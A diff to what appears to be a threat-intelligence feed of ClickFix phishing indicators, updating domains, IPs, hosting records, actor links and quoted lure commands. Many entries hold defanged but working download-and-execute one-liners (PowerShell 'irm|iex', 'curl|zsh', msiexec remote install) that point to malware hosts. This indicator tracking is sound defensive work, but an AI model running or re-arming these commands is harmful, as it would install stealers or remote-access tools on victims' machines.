@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5052,
+ "count": 5053,
  "indicators": [
   {
    "indicator": "1.15.58.123",
@@ -3119,7 +3119,8 @@
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -12041,15 +12042,17 @@
    "actor_link": null,
    "commands": [
     "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
+    "MSiEXEc.exe /package http:/\\www.api-point-cf.cfd q4ysbulmzpoun /Q S1=\" \"",
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "ncheck-brows.beer",
+    "www.api-point-cf.cfd",
     "codes.browse-cdn.beer",
     "id-verfied.boats"
    ],
    "lure_from": [
+    "browse-nnccodes.beer",
     "codes.caffe-img.com"
    ]
   },
@@ -17685,6 +17688,56 @@
     "id-dns.net"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "almara.rs",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-11",
+   "last_seen": "2026-11-11",
+   "last_online": "2026-11-11",
+   "offline_since": null,
+   "url": "https://almara.rs/",
+   "brand": "Google Chrome",
+   "product": null,
+   "hosting": "Hetzner",
+   "dns": "dwhost.net",
+   "ip": "144.76.87.58",
+   "asn": "AS24940",
+   "org": "HETZNER-AS Hetzner Online GmbH, DE",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "144.76.87.58",
+     "asn": "AS24940",
+     "org": "HETZNER-AS Hetzner Online GmbH, DE",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "almara.rs",
+     "status": "online",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell -nop -c \"$f=$env:TEMP+'\\clakr.ps1';curl.exe -sk -o $f 'hxxps[:]//birdo[.]site/S0M2jnBQVdwwNi5h';powershell -ep bypass -File $f\""
+   ],
+   "connects_to": [
+    "birdo.site"
+   ],
+   "lure_from": [
+    "sentrydb.org"
+   ]
   },
   {
    "indicator": "almarsagroup.ae",
@@ -29330,8 +29383,8 @@
      "last_seen": "2026-11-04"
     }
    ],
-   "actor": null,
-   "actor_link": null,
+   "actor": "dprk",
+   "actor_link": "linked",
    "commands": [
     "curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
     "curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd",
@@ -30729,12 +30782,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustresnew.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -54798,14 +54853,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//nexguard[.]pro/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
-    "t-trustresnew.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -71235,6 +71291,20 @@
      "last_seen": "2026-11-11"
     },
     {
+     "ip": "2a02:4780:84:46a7:ba3b:c39b:6e34:c5b0",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    },
+    {
+     "ip": "2a02:4780:84:86a0:9f7b:bc0a:a356:d56d",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    },
+    {
      "ip": "2a02:4780:84:a7a0:dbd5:1a45:323f:8fc5",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
@@ -85932,7 +86002,8 @@
    ],
    "lure_from": [
     "framesavecloudjs.beer",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -91930,12 +92001,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustresnew.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -118596,12 +118669,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustresnew.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -133407,6 +133482,7 @@
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "yaponovosh.org",
+    "herosdvakit.org",
     "ktoktotam.cc",
     "ciganshina.org",
     "pakistanskimalchik.org",
@@ -161151,9 +161227,9 @@
    "lure_from": [
     "btorsercoyt31.cc",
     "verifyidentrob01.cc",
-    "codes.caffe-img.com",
     "fcdnbovres.cc",
     "fudcomcheck.art",
+    "codes.caffe-img.com",
     "codes.browse-cdn.beer"
    ]
   },
@@ -173391,10 +173467,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "btorsercoyt31.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "btorsercoyt31.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -179574,12 +179650,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustresnew.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -180927,7 +181005,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -185164,6 +185243,56 @@
    ],
    "lure_from": [
     "interseq.at"
+   ]
+  },
+  {
+   "indicator": "petersen-malermeister.de",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-11",
+   "last_seen": "2026-11-11",
+   "last_online": "2026-11-11",
+   "offline_since": null,
+   "url": "https://petersen-malermeister.de/",
+   "brand": "Google Chrome",
+   "product": null,
+   "hosting": "CLOUDPIT dogado GmbH",
+   "dns": "cloudpit.io",
+   "ip": "91.203.110.209",
+   "asn": "AS45012",
+   "org": "CLOUDPIT dogado GmbH, DE",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "91.203.110.209",
+     "asn": "AS45012",
+     "org": "CLOUDPIT dogado GmbH, DE",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "petersen-malermeister.de",
+     "status": "online",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell -nop -c \"$f=$env:TEMP+'\\clakr.ps1';curl.exe -sk -o $f 'hxxps[:]//birdo[.]site/S0M2jnBQVdwwNi5h';powershell -ep bypass -File $f\""
+   ],
+   "connects_to": [
+    "birdo.site"
+   ],
+   "lure_from": [
+    "sentrydb.org"
    ]
   },
   {
@@ -196770,10 +196899,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "btorsercoyt31.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "btorsercoyt31.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -207033,7 +207162,8 @@
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -216177,11 +216307,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -217723,10 +217854,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "btorsercoyt31.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "btorsercoyt31.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -233685,11 +233816,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -249109,6 +249241,7 @@
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "yaponovosh.org",
+    "herosdvakit.org",
     "ktoktotam.cc",
     "ciganshina.org",
     "pakistanskimalchik.org",
@@ -252998,9 +253131,9 @@
    "lure_from": [
     "bootstrup-framework-js.beer",
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "btorsercoyt31.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -253205,90 +253338,6 @@
    ],
    "lure_from": [
     "interseq.at"
-   ]
-  },
-  {
-   "indicator": "v79.ad",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-26",
-   "last_seen": "2026-11-11",
-   "last_online": "2026-11-11",
-   "offline_since": null,
-   "url": "https://v79.ad/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.152.29",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.152.29",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-11"
-    },
-    {
-     "ip": "2606:4700:3033::ac43:981d",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-11"
-    },
-    {
-     "ip": "104.21.56.135",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-11-11"
-    },
-    {
-     "ip": "172.64.80.1",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-11"
-    },
-    {
-     "ip": "2606:4700:3032::6815:3887",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-04",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "v79.ad",
-     "status": "online",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6082|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=6082|iex</span>",
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=b435|iex"
-   ],
-   "connects_to": [
-    "verifyidentrob01.cc",
-    "ubbrobccheck20.cc",
-    "zurggoyttjof21.cc"
-   ],
-   "lure_from": [
-    "btorsercoyt31.cc",
-    "govrobczxc.cc",
-    "fudcomcheck.art"
    ]
   },
   {
@@ -262718,12 +262767,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustresnew.com",
-    "trek-72.com"
+    "trek-72.com",
+    "nexguard.pro",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -262850,16 +262901,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "iex(irm 'hxxps[:]//gfisoda[.]biz/01/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
-    "hagosuro.lc",
     "gfisoda.biz",
+    "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -263069,7 +263121,8 @@
    ],
    "lure_from": [
     "sky.dolcefantasia.us",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-nnccodes.beer"
    ]
   },
   {
